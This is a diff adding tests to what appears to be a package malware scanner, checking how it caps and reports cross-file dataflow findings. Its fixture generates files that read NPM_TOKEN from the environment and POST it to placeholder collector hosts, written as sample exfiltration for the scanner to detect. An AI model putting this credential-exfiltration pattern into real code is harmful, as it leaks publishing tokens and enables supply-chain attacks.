@@ -150,6 +150,37 @@ async function runIncompletenessTests() {
     } finally { cleanup(dir); }
   });
 
+  // `kept` cross-file flows to third-party collectors: they survive the destination filter.
+  const keptFlowsFixture = (kept) => {
+    const files = { 'index.js': "require('./s00.js');", 'reader.js': 'module.exports = process.env.NPM_TOKEN;' };
+    for (let i = 0; i < kept; i++) {
+      files[`s${String(i).padStart(2, '0')}.js`] =
+        `const token = require('./reader.js'); fetch('https://collector-${i}.net/c',{method:'POST',body:token});`;
+    }
+    return files;
+  };
+
+  await asyncTest('INCOMPLETE: more than MAX_FLOWS flows after the filter -> INCONCLUSIVE flow-limit', async () => {
+    const dir = makePkg(keptFlowsFixture(25));
+    try {
+      const r = await runScanDirect(dir);
+      const flows = r.threats.filter(t => t.type === 'cross_file_dataflow');
+      assert(flows.length <= 20, 'published flows stay capped at MAX_FLOWS, got ' + flows.length);
+      assert(r.analysis.status === 'INCONCLUSIVE' && reasons(r).includes('moduleGraph/flow-limit'),
+        'flows dropped past the quota must be reported: ' + JSON.stringify(r.analysis));
+    } finally { cleanup(dir); }
+  });
+
+  await asyncTest('INCOMPLETE: exactly MAX_FLOWS flows after the filter stays COMPLETE', async () => {
+    const dir = makePkg(keptFlowsFixture(20));
+    try {
+      const r = await runScanDirect(dir);
+      assert(r.threats.filter(t => t.type === 'cross_file_dataflow').length > 0, 'control: flows must be found');
+      assert(!reasons(r).includes('moduleGraph/flow-limit'), 'flow-limit must not be reported at the quota: ' +
+        JSON.stringify(r.analysis));
+    } finally { cleanup(dir); }
+  });
+
   await asyncTest('INCOMPLETE: 20 decoys alone (first-party destination) yield no cross-file flow', async () => {
     const dir = makePkg(flowQuotaFixture(20, false));
     try {
